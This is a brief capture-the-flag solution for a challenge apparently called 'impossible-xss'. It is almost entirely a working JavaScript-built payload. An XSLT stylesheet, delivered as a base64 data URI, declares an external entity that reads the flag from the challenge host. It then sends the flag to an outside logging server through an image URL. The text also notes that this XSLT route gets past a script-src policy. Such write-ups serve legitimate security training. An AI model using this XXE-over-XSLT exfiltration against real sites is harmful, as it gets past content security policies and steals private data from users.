use XSLT to use an XXE that loads the flag and sends the flag to your server

XSLT is stopped by script-src, but not by devtools setJavascriptEnabled


```js
ss = `<?xml version="1.0"?>
<!DOCTYPE a [
   <!ENTITY xxe SYSTEM  "https://impossible-xss.mc.ax/flag" >]>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template match="/asdf">
    <HTML>
      <HEAD>
        <TITLE></TITLE>
      </HEAD>
      <BODY>
        <img>
          <xsl:attribute name="src">
            https://hc.lc/log2.php?&xxe;
          </xsl:attribute>
        </img>
      </BODY>
    </HTML>
  </xsl:template>
</xsl:stylesheet>`

xml=`<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="data:text/plain;base64,${btoa(ss)}"?>
<asdf></asdf>`
payload=encodeURIComponent(xml)
```
